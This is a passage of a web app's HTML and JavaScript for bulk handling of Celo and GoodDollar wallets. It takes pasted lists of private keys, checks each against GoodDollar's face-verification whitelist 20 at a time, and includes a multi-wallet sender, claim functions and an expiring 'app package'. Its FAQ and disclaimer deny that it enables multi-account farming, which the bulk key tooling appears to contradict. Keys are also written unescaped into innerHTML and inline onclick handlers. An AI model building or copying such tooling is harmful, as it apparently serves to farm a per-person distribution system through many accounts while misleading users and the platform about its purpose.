            const password = prompt('üîê Enter admin password to toggle maintenance mode:');
            
            if (password === null) {
                toggle.checked = !newState;
                return;
            }
            
            try {
                const response = await fetch('/api/set-maintenance-mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        password: password,
                        maintenance_mode: newState
                    })
                });
                
                const data = await response.json();
                
                if (response.ok && data.success) {
                    updateMaintenanceToggleUI(newState);
                    alert(`‚úÖ XDC Maintenance Mode: ${newState ? 'ON (disabled)' : 'OFF (enabled)'}`);
                    console.log('‚úÖ Maintenance mode updated:', newState);
                } else {
                    toggle.checked = !newState;
                    alert('‚ùå Invalid password or error');
                }
            } catch (err) {
                toggle.checked = !newState;
                alert('‚ùå Error: ' + err.message);
                console.error('Toggle error:', err);
            }
        }

        // Permanent Verified Account Management
        async function addPermanentVerified() {
            const address = document.getElementById('permanentVerifyAddress').value.trim();
            const statusDiv = document.getElementById('permanentVerifyStatus');
            
            if (!address || !address.startsWith('0x')) {
                statusDiv.innerHTML = '‚ùå Valid address (0x...) ‡¶¶‡¶ø‡¶®';
                statusDiv.style.color = '#ff6b6b';
                return;
            }
            
            statusDiv.innerHTML = '‚è≥ Processing... ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®...';
            statusDiv.style.color = '#ffc107';
            
            try {
                const response = await fetch('/api/permanent-verified', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: address, action: 'add' })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    statusDiv.innerHTML = `
                        <strong style="color: #4caf50;">‚úÖ ${result.message}</strong><br>
                        <small style="color: #e9d5ff;">${result.note}</small>
                    `;
                    statusDiv.style.color = '#4caf50';
                    document.getElementById('permanentVerifyAddress').value = '';
                } else {
                    statusDiv.innerHTML = `‚ùå ${result.error}`;
                    statusDiv.style.color = '#ff6b6b';
                }
            } catch (error) {
                statusDiv.innerHTML = `‚ùå Error: ${error.message}`;
                statusDiv.style.color = '#ff6b6b';
            }
        }
        
        async function listPermanentVerified() {
            const statusDiv = document.getElementById('permanentVerifyStatus');
            statusDiv.innerHTML = '‚è≥ Loading... ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®...';
            statusDiv.style.color = '#ffc107';
            
            try {
                const response = await fetch('/api/permanent-verified', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'list' })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    if (result.count === 0) {
                        statusDiv.innerHTML = 'üì≠ ‡¶ï‡ßã‡¶®‡ßã permanent verified account ‡¶®‡ßá‡¶á';
                        statusDiv.style.color = '#999';
                    } else {
                        let html = `<strong style="color: #4caf50;">‚úÖ ${result.count} Permanent Verified:</strong><br><div style="margin-top: 8px; max-height: 300px; overflow-y: auto;">`;
                        result.addresses.forEach(addr => {
                            html += `<div style="background: rgba(0,0,0,0.3); padding: 6px; margin: 4px 0; border-radius: 4px; font-size: 11px; word-break: break-all;">${addr.address}<br><small style="color: #aaa;">${new Date(addr.verified_at).toLocaleDateString('bn-BD')}</small></div>`;
                        });
                        html += '</div>';
                        statusDiv.innerHTML = html;
                        statusDiv.style.color = '#4caf50';
                    }
                } else {
                    statusDiv.innerHTML = `‚ùå ${result.error}`;
                    statusDiv.style.color = '#ff6b6b';
                }
            } catch (error) {
                statusDiv.innerHTML = `‚ùå Error: ${error.message}`;
                statusDiv.style.color = '#ff6b6b';
            }
        }

        // Direct CELO Claim Function
        async function claimFreeCELO() {
            const address = document.getElementById('celoClaimAddress').value.trim();
            const statusDiv = document.getElementById('celoClaimStatus');
            
            if (!address || !address.startsWith('0x')) {
                statusDiv.innerHTML = '‚ùå Valid address ‡¶¶‡¶ø‡¶® (0x... ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ì‡¶Ø‡¶º‡¶æ ‡¶â‡¶ö‡¶ø‡¶§)';
                statusDiv.style.color = '#ff6b6b';
                return;
            }
            
            statusDiv.innerHTML = '‚è≥ Processing... ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®...';
            statusDiv.style.color = '#ffc107';
            
            try {
                const response = await fetch('/api/claim-celo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: address })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    statusDiv.innerHTML = `
                        <strong style="color: #4caf50;">‚úÖ ‡¶∏‡¶´‡¶≤!</strong><br>
                        <span style="font-size: 11px;">From: ${result.faucet}</span><br>
                        Address: <code style="background: rgba(255,255,255,0.1); padding: 2px 4px;">${address.slice(0,10)}...${address.slice(-8)}</code><br>
                        <span style="color: #ffc107;">‚è∞ ${result.note}</span>
                    `;
                    statusDiv.style.color = '#4caf50';
                    document.getElementById('celoClaimAddress').value = '';
                } else {
                    statusDiv.innerHTML = `
                        ‚ùå ${result.error}<br>
                        <small style="color: #ccc;">Alternative: GoodWallet ‡¶è face verify ‡¶ï‡¶∞‡ßá G$ claim ‡¶ï‡¶∞‡ßÅ‡¶®</small>
                    `;
                    statusDiv.style.color = '#ff6b6b';
                }
            } catch (error) {
                statusDiv.innerHTML = `
                    ‚ùå Error: ${error.message}<br>
                    <small>‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®</small>
                `;
                statusDiv.style.color = '#ff6b6b';
            }
        }

    </script>
    <!-- Face Verification Check Section -->
    <div id="faceVerificationCheck" class="view">
        <div class="container">
            <h1>Face Verification Check</h1>
            <div class="subtitle">Check if private keys are face verified (Whitelisted) - Batch Processing (20 at a time)</div>
            
            <div class="form-group">
                <label>Enter Private Keys (One per line)</label>
                <textarea id="fvPrivateKeys" rows="10" placeholder="Enter private keys here..."></textarea>
                <small style="color: #666; display: block; margin-top: 5px;">üí° Processes 20 keys in parallel for faster verification</small>
                <div style="display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap;">
                    <button type="button" class="validate-btn" onclick="showFVAddresses()" style="background: #2196F3; padding: 8px 12px; font-size: 12px;">üìç Show Addresses</button>
                    <button type="button" class="validate-btn" onclick="copyAllFVAddresses()" style="background: #4caf50; padding: 8px 12px; font-size: 12px;">üìã Copy All Addresses</button>
                    <button type="button" class="validate-btn" onclick="checkFVDuplicates()" style="background: #ff9800; padding: 8px 12px; font-size: 12px;">‚ö†Ô∏è Check Duplicates</button>
                    <button type="button" class="validate-btn" onclick="removeFVDuplicates()" style="background: #f44336; padding: 8px 12px; font-size: 12px;">üóëÔ∏è Remove Duplicates</button>
                </div>
            </div>

            <!-- Address Display Section -->
            <div id="fvAddressDisplaySection" style="display:none; margin: 15px 0; padding: 15px; background: #f5f5f5; border-radius: 8px;">
                <h3 style="margin-top: 0;">Extracted Addresses</h3>
                <div id="fvAddressesList" style="max-height: 200px; overflow-y: auto;"></div>
            </div>

            <!-- Duplicates Section -->
            <div id="fvDuplicatesSection" style="display:none; margin: 15px 0; padding: 15px; background: #fff3cd; border-left: 4px solid #ff9800; border-radius: 8px;">
                <h3 style="margin-top: 0; color: #856404;">‚ö†Ô∏è Duplicate Keys Found</h3>
                <div id="fvDuplicatesList" style="max-height: 200px; overflow-y: auto;"></div>
            </div>
            
            <button class="button" onclick="checkFaceVerification()">Check Verification (Batch Mode)</button>
            
            <div class="stats" id="fvStats" style="display:none; margin-top: 20px;">
                <div class="stat-card" style="border-left: 4px solid #4caf50;">
                    <div class="stat-value" id="fvVerifiedCount">0</div>
                    <div class="stat-label">Verified</div>
                </div>
                <div class="stat-card" style="border-left: 4px solid #f44336;">
                    <div class="stat-value" id="fvUnverifiedCount">0</div>
                    <div class="stat-label">Not Verified</div>
                </div>
            </div>

            <div class="results-container" style="display:none; grid-template-columns: 1fr; gap: 20px; margin-top: 20px;" id="fvResultsArea">
                 <!-- Verified Keys Section -->
                <div id="fvVerifiedSection" class="result-box" style="margin-bottom: 15px; border: 1px solid #4caf50; border-radius: 8px; overflow: hidden;">
                    <div class="result-header" onclick="toggleResultBox('fvVerifiedContent')" style="background: #e8f5e9; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center;">
                        <h3 style="margin: 0; color: #2e7d32;">‚úÖ Verified Keys (<span id="fvVerifiedCountHeader">0</span>)</h3>
                        <span class="toggle-icon">‚ñº</span>
                    </div>
                    <div id="fvVerifiedContent" class="result-content" style="display: none; padding: 15px; background: white;">
                        <div style="text-align: right; margin-bottom: 10px;">
                            <button class="button" onclick="copyAllFVKeys('fvVerifiedListContainer')" style="background: #4caf50; padding: 8px 16px; font-size: 14px; width: auto;">üìã Copy All Verified</button>
                        </div>
                        <div id="fvVerifiedListContainer" class="keys-list-container"></div>
                    </div>
                </div>

                <!-- Not Verified Keys Section -->
                <div id="fvUnverifiedSection" class="result-box" style="border: 1px solid #f44336; border-radius: 8px; overflow: hidden;">
                    <div class="result-header" onclick="toggleResultBox('fvUnverifiedContent')" style="background: #ffebee; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center;">
                        <h3 style="margin: 0; color: #c62828;">‚ùå Not Verified Keys (<span id="fvUnverifiedCountHeader">0</span>)</h3>
                        <span class="toggle-icon">‚ñº</span>
                    </div>
                    <div id="fvUnverifiedContent" class="result-content" style="display: none; padding: 15px; background: white;">
                         <div style="text-align: right; margin-bottom: 10px;">
                            <button class="button" onclick="copyAllFVKeys('fvUnverifiedListContainer')" style="background: #f44336; padding: 8px 16px; font-size: 14px; width: auto;">üìã Copy All Not Verified</button>
                        </div>
                        <div id="fvUnverifiedListContainer" class="keys-list-container"></div>
                    </div>
                </div>
            </div>
            
            <div id="fvLogs" class="logs" style="display:none;"></div>
        </div>
    </div>

    <script>
        async function checkFaceVerification() {
            const privateKeysInput = document.getElementById('fvPrivateKeys').value.trim();
            if (!privateKeysInput) {
                alert('Please enter private keys');
                return;
            }

            const keys = privateKeysInput.split('\n').map(k => k.trim()).filter(k => k);
            if (keys.length === 0) return;

            const logsDiv = document.getElementById('fvLogs');
            logsDiv.style.display = 'block';
            logsDiv.innerHTML = '<h2>Processing ' + keys.length + ' keys in batch (20 parallel)...</h2>';
            
            document.getElementById('fvStats').style.display = 'grid';
            document.getElementById('fvResultsArea').style.display = 'grid';
            
            // Clear previous results
            document.getElementById('fvVerifiedListContainer').innerHTML = '';
            document.getElementById('fvUnverifiedListContainer').innerHTML = '';
            document.getElementById('fvVerifiedCount').innerText = '0';
            document.getElementById('fvUnverifiedCount').innerText = '0';
            document.getElementById('fvVerifiedCountHeader').innerText = '0';
            document.getElementById('fvUnverifiedCountHeader').innerText = '0';

            let vCount = 0;
            let uCount = 0;

            // Provider
            const provider = new ethers.JsonRpcProvider('https://forno.celo.org');
            const IDENTITY_ABI = ["function isWhitelisted(address) view returns (bool)"];

            try {
                const identityAddress = '0xC361A6E67822a0EDc17D899227dd9FC50BD62F42';
                const identityContract = new ethers.Contract(identityAddress, IDENTITY_ABI, provider);

                // Process in batches of 20 keys at once
                const BATCH_SIZE = 20;
                
                for (let batch = 0; batch < keys.length; batch += BATCH_SIZE) {
                    const batchKeys = keys.slice(batch, batch + BATCH_SIZE);
                    
                    // Process all keys in this batch in parallel
                    const batchPromises = batchKeys.map(async (key, idx) => {
                        const actualIndex = batch + idx;
                        let cleanKey = key;

                        if (key.includes(':')) {
                            const parts = key.split(':');
                            cleanKey = parts[parts.length - 1].trim();
                        }

                        try {
                            let wallet;
                            let displayKey = cleanKey;
                            if (cleanKey.startsWith('0x')) {
                                 wallet = new ethers.Wallet(cleanKey, provider);
                            } else {
                                 wallet = new ethers.Wallet('0x' + cleanKey, provider);
                                 displayKey = '0x' + cleanKey;
                            }
                            
                            const isWhitelisted = await identityContract.isWhitelisted(wallet.address);
                            
                            return {
                                success: true,
                                verified: isWhitelisted,
                                displayKey,
                                address: wallet.address,
                                index: actualIndex
                            };
                        } catch (err) {
                            return {
                                success: false,
                                error: err.message,
                                index: actualIndex
                            };
                        }
                    });

                    const results = await Promise.all(batchPromises);
                    
                    results.forEach(result => {
                        if (result.success) {
                            if (result.verified) {
                                vCount++;
                                addKeyToUI('fvVerifiedListContainer', result.displayKey);
                                log(`[${result.index+1}/${keys.length}] ‚úÖ Verified: ${result.address}`, 'success', logsDiv);
                            } else {
                                uCount++;
                                addKeyToUI('fvUnverifiedListContainer', result.displayKey);
                                log(`[${result.index+1}/${keys.length}] ‚ùå Not Verified: ${result.address}`, 'error', logsDiv);
                            }
                        } else {
                            log(`[${result.index+1}/${keys.length}] ‚ö†Ô∏è Error: ${result.error}`, 'error', logsDiv);
                        }
                        
                        // Update stats in real-time
                        document.getElementById('fvVerifiedCount').innerText = vCount;
                        document.getElementById('fvUnverifiedCount').innerText = uCount;
                        document.getElementById('fvVerifiedCountHeader').innerText = vCount;
                        document.getElementById('fvUnverifiedCountHeader').innerText = uCount;
                    });

                    // Small delay between batches to prevent overwhelming RPC
                    await new Promise(r => setTimeout(r, 100));
                }
                
                log(`‚úÖ Verification Complete! Verified: ${vCount}, Not Verified: ${uCount}`, 'success', logsDiv);

            } catch (error) {
                console.error(error);
                log(`‚ùå Critical Error: ${error.message}`, 'error', logsDiv);
            }
        }

        function log(message, type, container) {
            if (!container) return;
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.innerText = message;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
        }

        function addKeyToUI(containerId, key) {
            const container = document.getElementById(containerId);
            const div = document.createElement('div');
            div.className = 'recent-key-item';
            div.style.marginBottom = '5px';
            div.innerHTML = `
                <span style="font-family: monospace; word-break: break-all; margin-right: 10px;">${key}</span>
                <button class="button" onclick="copySingleFVKey('${key}', this)" style="background: #2196F3; padding: 4px 10px; font-size: 12px; width: auto; min-width: 60px;">Copy</button>
            `;
            container.appendChild(div);
        }

        function toggleResultBox(contentId) {
            const content = document.getElementById(contentId);
            if (content.style.display === 'none') {
                content.style.display = 'block';
            } else {
                content.style.display = 'none';
            }
        }

        function copySingleFVKey(text, btn) {
             navigator.clipboard.writeText(text).then(() => {
                const originalText = btn.innerText;
                btn.innerText = 'Copied!';
                btn.style.background = '#4caf50';
                setTimeout(() => {
                    btn.innerText = originalText;
                    btn.style.background = '#2196F3';
                }, 1500);
            });
        }
        
        function copyAllFVKeys(containerId) {
             const container = document.getElementById(containerId);
             const keys = [];
             const spans = container.querySelectorAll('span');
             spans.forEach(span => keys.push(span.innerText));
             
             if(keys.length === 0) return;
             
             const textToCopy = keys.join('\n');
             navigator.clipboard.writeText(textToCopy).then(() => {
                 alert('All keys copied to clipboard!');
             });
        }

        // Extract addresses from private keys
        function extractAddressesFromKeys() {
            const privateKeysInput = document.getElementById('fvPrivateKeys').value.trim();
            const keys = privateKeysInput.split('\n').map(k => k.trim()).filter(k => k);
            const addresses = [];
            const provider = new ethers.JsonRpcProvider('https://forno.celo.org');
            
            keys.forEach(key => {
                try {
                    let cleanKey = key;
                    if (key.includes(':')) {
                        const parts = key.split(':');
                        cleanKey = parts[parts.length - 1].trim();
                    }
                    
                    let wallet;
                    if (cleanKey.startsWith('0x')) {
                        wallet = new ethers.Wallet(cleanKey, provider);
                    } else {
                        wallet = new ethers.Wallet('0x' + cleanKey, provider);
                    }
                    addresses.push(wallet.address);
                } catch (err) {
                    // Skip invalid keys
                }
            });
            
            return addresses;
        }

        // Show all addresses
        function showFVAddresses() {
            const addresses = extractAddressesFromKeys();
            const section = document.getElementById('fvAddressDisplaySection');
            const list = document.getElementById('fvAddressesList');
            
            if (addresses.length === 0) {
                alert('No valid keys found');
                return;
            }
            
            list.innerHTML = '';
            addresses.forEach((addr, idx) => {
                const div = document.createElement('div');
                div.style.cssText = 'margin-bottom: 8px; padding: 8px; background: white; border-radius: 6px; display: flex; justify-content: space-between; align-items: center;';
                div.innerHTML = `
                    <span style="font-family: monospace; word-break: break-all; flex: 1;">${addr}</span>
                    <button class="button" onclick="copySingleAddress('${addr}', this)" style="background: #2196F3; padding: 4px 10px; font-size: 12px; width: auto; margin-left: 8px;">Copy</button>
                `;
                list.appendChild(div);
            });
            
            section.style.display = 'block';
            section.querySelector('h3').innerText = `Extracted Addresses (${addresses.length})`;
        }

        // Copy single address
        function copySingleAddress(address, btn) {
            navigator.clipboard.writeText(address).then(() => {
                const originalText = btn.innerText;
                btn.innerText = '‚úì Copied!';
                btn.style.background = '#4caf50';
                setTimeout(() => {
                    btn.innerText = originalText;
                    btn.style.background = '#2196F3';
                }, 1500);
            });
        }

        // Copy all addresses at once
        function copyAllFVAddresses() {
            const addresses = extractAddressesFromKeys();
            
            if (addresses.length === 0) {
                alert('No valid keys found');
                return;
            }
            
            const textToCopy = addresses.join('\n');
            navigator.clipboard.writeText(textToCopy).then(() => {
                alert(`Copied ${addresses.length} addresses to clipboard!`);
            });
        }

        // Check for duplicate keys
        function checkFVDuplicates() {
            const privateKeysInput = document.getElementById('fvPrivateKeys').value.trim();
            const keys = privateKeysInput.split('\n').map(k => k.trim()).filter(k => k);
            
            // Normalize keys for comparison
            const normalizedKeys = keys.map(key => {
                let cleanKey = key;
                if (key.includes(':')) {
                    const parts = key.split(':');
                    cleanKey = parts[parts.length - 1].trim();
                }
                if (!cleanKey.startsWith('0x')) {
                    cleanKey = '0x' + cleanKey;
                }
                return cleanKey.toLowerCase();
            });
            
            // Find duplicates
            const duplicates = {};
            normalizedKeys.forEach((key, idx) => {
                if (!duplicates[key]) {
                    duplicates[key] = [];
                }
                duplicates[key].push(idx + 1); // Line numbers (1-indexed)
            });
            
            const duplicateKeys = Object.entries(duplicates).filter(([key, indices]) => indices.length > 1);
            
            if (duplicateKeys.length === 0) {
                alert('‚úÖ No duplicate keys found!');
                document.getElementById('fvDuplicatesSection').style.display = 'none';
                return;
            }
            
            const section = document.getElementById('fvDuplicatesSection');
            const list = document.getElementById('fvDuplicatesList');
            list.innerHTML = '';
            
            duplicateKeys.forEach(([key, indices]) => {
                const div = document.createElement('div');
                div.style.cssText = 'margin-bottom: 10px; padding: 10px; background: white; border-radius: 6px;';
                div.innerHTML = `
                    <div style="font-family: monospace; word-break: break-all; margin-bottom: 8px; font-size: 12px;">${key}</div>
                    <div style="color: #666; font-size: 12px;">Found on lines: ${indices.join(', ')}</div>
                    <button class="button" onclick="copyDuplicateKey('${key}')" style="background: #2196F3; padding: 4px 10px; font-size: 12px; width: auto; margin-top: 8px;">üìã Copy</button>
                `;
                list.appendChild(div);
            });
            
            section.style.display = 'block';
            section.querySelector('h3').innerText = `‚ö†Ô∏è ${duplicateKeys.length} Duplicate Key(s) Found`;
        }

        // Copy duplicate key
        function copyDuplicateKey(key) {
            navigator.clipboard.writeText(key).then(() => {
                alert('Key copied to clipboard!');
            });
        }

        // Remove all duplicate keys
        function removeFVDuplicates() {
            const privateKeysInput = document.getElementById('fvPrivateKeys').value.trim();
            const keys = privateKeysInput.split('\n').map(k => k.trim()).filter(k => k);
            
            // Normalize keys for comparison
            const seen = {};
            const uniqueKeys = [];
            
            keys.forEach(key => {
                let cleanKey = key;
                if (key.includes(':')) {
                    const parts = key.split(':');
                    cleanKey = parts[parts.length - 1].trim();
                }
                if (!cleanKey.startsWith('0x')) {
                    cleanKey = '0x' + cleanKey;
                }
                const normalized = cleanKey.toLowerCase();
                
                if (!seen[normalized]) {
                    seen[normalized] = true;
                    uniqueKeys.push(key); // Keep original formatting
                }
            });
            
            const removed = keys.length - uniqueKeys.length;
            document.getElementById('fvPrivateKeys').value = uniqueKeys.join('\n');
            
            if (removed > 0) {
                alert(`‚úÖ Removed ${removed} duplicate key(s)! ${uniqueKeys.length} unique keys remaining.`);
                document.getElementById('fvDuplicatesSection').style.display = 'none';
            } else {
                alert('‚úÖ No duplicates found - all keys are unique!');
            }
        }
    </script>
    <script>
        // Feature Availability Check
        function checkFeatureAvailability() {
            const enabledFeatures = ['faceVerificationCheck', 'multiSender', 'tokenCollection'];
            const currentView = document.querySelector('.view:not([style*="display: none"])');
            const currentViewId = currentView ? currentView.id : null;
            
            if (!enabledFeatures.includes(currentViewId)) {
                return false;
            }
            return true;
        }
        
        function showUnavailableMessage() {
            alert('‚è≥ This feature is temporarily unavailable.\n\nCurrently available features:\n‚úÖ Face Verification Check\n‚úÖ Multi Sender (CELO)\n‚úÖ Batch Token Collection');
        }

        // Disable all form elements in temporarily unavailable features on page load
        window.addEventListener('load', function() {
            const disabledViews = ['batchCall', 'batchClaim', 'multiGoodDollarSender', 'balanceChecker', 'swap', 'dailyTasks', 'helpSupport', 'batchXPost'];
            
            disabledViews.forEach(viewId => {
                const view = document.getElementById(viewId);
                if (view) {
                    const inputs = view.querySelectorAll('input, select, textarea');
                    inputs.forEach(el => {
                        el.disabled = true;
                    });
                    
                    const buttons = view.querySelectorAll('button');
                    buttons.forEach(btn => {
                        btn.onclick = () => showUnavailableMessage();
                        btn.disabled = true;
                    });
                }
            });
        });

        // Multi G$ Sender Logic
        async function runMultiGoodDollarSender() {
            showUnavailableMessage();
            return;
                let currentNonce = await wallet.getNonce("pending");
                log(`Initial Nonce: ${currentNonce}`, 'info', logsDiv);
                
                // Batch size for better control, though we process rapidly
                const BATCH_SIZE = 50; 

                for (let i = 0; i < addresses.length; i += BATCH_SIZE) {
                    const batch = addresses.slice(i, i + BATCH_SIZE);
                    log(`üöÄ Sending batch ${Math.floor(i/BATCH_SIZE) + 1} (${batch.length} txs)...`, 'info', logsDiv);
                    
                    const batchPromises = batch.map(async (addr, idx) => {
                        const myNonce = currentNonce + idx; // Calculate nonce locally
                        try {
                            // Use fixed gas limit to skip estimation and prevent blocking
                            const tx = await contract.transfer(addr, amountWei, { 
                                nonce: myNonce,
                                gasLimit: 250000 // Safe buffer for G$ transfer
                            });
                            
                            log(`‚úÖ Sent to ${addr.substring(0,6)}... (Nonce: ${myNonce}) Hash: ${tx.hash.substring(0,10)}...`, 'success', logsDiv);
                            success++;
                            document.getElementById('gSenderStatSuccess').innerText = success;
                            return tx;
                        } catch (err) {
                            fail++;
                            document.getElementById('gSenderStatError').innerText = fail;
                            log(`‚ùå Failed ${addr.substring(0,6)}... (Nonce: ${myNonce}): ${err.message}`, 'error', logsDiv);
                            return null;
                        }
                    });

                    // Update nonce for next batch
                    currentNonce += batch.length;
                    
                    // Wait for the batch to be BROADCAST (not mined)
                    await Promise.all(batchPromises);
                }

                log('All transactions broadcasted! Waiting for network confirmation...', 'info', logsDiv);
                alert(`üöÄ Sending complete!\n\nSuccess: ${success}\nFailed: ${fail}\n\nTransactions are broadcasting to the network.`);

            } catch (err) {
                 log(`‚ùå Critical Error: ${err.message}`, 'error', logsDiv);
                 alert('Error: ' + err.message);
            }
        }

        // Countdown Timer Logic
        function startAppCountdown() {
            // Set fixed target date: January 15, 2026 (approx 1 month from now for demo)
            // Using a fixed date ensures it counts down consistently even after page reload
            const targetDate = new Date('2026-01-15T00:00:00');
            
            function update() {
                const now = new Date();
                const diff = targetDate - now;
                
                if (diff <= 0) {
                    const el = document.getElementById('appCountdown');
                    if(el) el.innerHTML = "‚è≥ App package expired";
                    return;
                }
                
                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
                
                const el = document.getElementById('appCountdown');
                if(el) el.innerHTML = `‚è≥ App package expires in ${days}d ${hours}h ${minutes}m ${seconds}s`;
            }
            
            setInterval(update, 1000); // Update every second
            update(); // Run immediately
        }
        
        // Start countdown on load
        window.addEventListener('load', startAppCountdown);
    </script>

    <!-- FAQ View -->
    <div id="faq" class="view">
        <div class="container">
            <h1>‚ùì Frequently Asked Questions</h1>
            <p class="subtitle">Learn more about how this tool works and GoodDollar compliance</p>
            
            <div style="background: #f5f5f5; border-radius: 8px; padding: 20px; line-height: 1.8;">
                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Does this app bypass GoodDollar face verification?</h3>
                    <p style="color: #666; margin-left: 20px;">A: No. All wallets must be verified directly by GoodDollar through their official face verification process. This app does not handle, interfere with, or bypass identity verification in any way.</p>
                </div>
                
                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Who owns the wallets used in this app?</h3>
                    <p style="color: #666; margin-left: 20px;">A: Each wallet is owned and controlled by its individual verified user. This app is non-custodial‚Äîwe never hold or manage your private keys. You remain in complete control at all times.</p>
                </div>
                
                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Does the app store private keys?</h3>
                    <p style="color: #666; margin-left: 20px;">A: No. This is a non-custodial application. All operations are performed client-side in your browser. Private keys are never sent to our servers and are not permanently stored by us.</p>
                </div>
                
                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Can one person control multiple accounts using this app?</h3>
                    <p style="color: #666; margin-left: 20px;">A: No. This tool is designed for verified users only, with one wallet per person as per GoodDollar's rules. The app is a utility tool for managing your own verified wallets, not for multi-account operations.</p>
                </div>
                
                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: What is batch execution used for?</h3>
                    <p style="color: #666; margin-left: 20px;">A: Batch execution is designed to:
                        <ul style="margin-top: 8px; margin-left: 40px;">
                            <li>Reduce repetitive actions and improve user experience</li>
                            <li>Improve accessibility for users managing verified accounts</li>
                            <li>Optimize gas usage efficiency</li>
                            <li>Process transactions faster for verified users</li>
                        </ul>
                    </p>
                </div>

                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Is this tool affiliated with GoodDollar?</h3>
                    <p style="color: #666; margin-left: 20px;">A: This is an independent utility tool created to help verified GoodDollar users. It is not affiliated with or endorsed by GoodDollar. Always verify with GoodDollar's official channels for authentication information.</p>
                </div>

                <div style="margin-bottom: 25px;">
                    <h3 style="color: #333; margin-bottom: 10px; font-size: 16px;">Q: Is my data safe?</h3>
                    <p style="color: #666; margin-left: 20px;">A: Yes. This is a client-side application. All data stays in your browser. We do not collect, store, or transmit private keys, addresses, or any sensitive information to external servers.</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Disclaimer View -->
    <div id="disclaimer" class="view">
        <div class="container">
            <h1>‚öñÔ∏è Disclaimer</h1>
            <p class="subtitle">Important legal and compliance information</p>
            
            <div style="background: #fff3cd; border-left: 4px solid #ff9800; border-radius: 6px; padding: 20px; margin-bottom: 25px;">
                <strong style="color: #cc6600; font-size: 16px;">‚ö†Ô∏è IMPORTANT NOTICE</strong>
                <p style="color: #333; margin-top: 10px; line-height: 1.8;">
                    This application is a <strong>non-custodial utility tool</strong>. Please read the following disclaimer carefully before using this application.
                </p>
            </div>

            <div style="background: #f5f5f5; border-radius: 8px; padding: 25px; line-height: 1.9;">
                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">What This Tool Does NOT Do:</h3>
                <ul style="color: #666; margin-left: 20px; margin-bottom: 25px;">
                    <li>‚ùå Does not create wallets or accounts</li>
                    <li>‚ùå Does not verify user identities</li>
                    <li>‚ùå Does not bypass GoodDollar eligibility or face verification requirements</li>
                    <li>‚ùå Does not store private keys on servers</li>
                    <li>‚ùå Does not perform identity verification</li>
                    <li>‚ùå Is not affiliated with or endorsed by GoodDollar</li>
                    <li>‚ùå Does not enable multi-account earning or farming</li>
                </ul>

                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">What This Tool DOES:</h3>
                <ul style="color: #666; margin-left: 20px; margin-bottom: 25px;">
                    <li>‚úÖ Helps verified users execute batch transactions more efficiently</li>
                    <li>‚úÖ Improves accessibility and user experience</li>
                    <li>‚úÖ Operates entirely client-side in your browser</li>
                    <li>‚úÖ Allows users to manage their own verified wallets</li>
                    <li>‚úÖ Processes transactions with user consent</li>
                </ul>

                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">User Responsibility:</h3>
                <p style="color: #666; margin-bottom: 15px;">
                    <strong>Each wallet belongs to a separate verified individual.</strong> By using this application, you confirm that:
                </p>
                <ul style="color: #666; margin-left: 20px; margin-bottom: 25px;">
                    <li>You own and control each private key you input</li>
                    <li>Each wallet is verified through GoodDollar's official process</li>
                    <li>You have full authority to perform transactions using these keys</li>
                    <li>You comply with GoodDollar's terms of service</li>
                    <li>You understand and accept the risks of blockchain transactions</li>
                </ul>

                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">Security Warning:</h3>
                <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 15px; border-radius: 4px; margin-bottom: 25px;">
                    <strong style="color: #c62828;">‚ö†Ô∏è NEVER share your private keys with anyone.</strong> This application never stores your private keys on external servers. All operations are performed in your browser only.
                </div>

                <h3 style="color: #333; margin-bottom: 15px; font-size: 16px;">No Warranty:</h3>
                <p style="color: #666; margin-bottom: 25px;">
                    This application is provided "AS IS" without warranty of any kind. We are not responsible for:
                </p>
                <ul style="color: #666; margin-left: 20px; margin-bottom: 25px;">
                    <li>Loss of funds due to incorrect transaction details</li>
                    <li>Network failures or blockchain congestion</li>
                    <li>Unauthorized access to your private keys</li>
                    <li>Any damages resulting from the use of this tool</li>
                </ul>

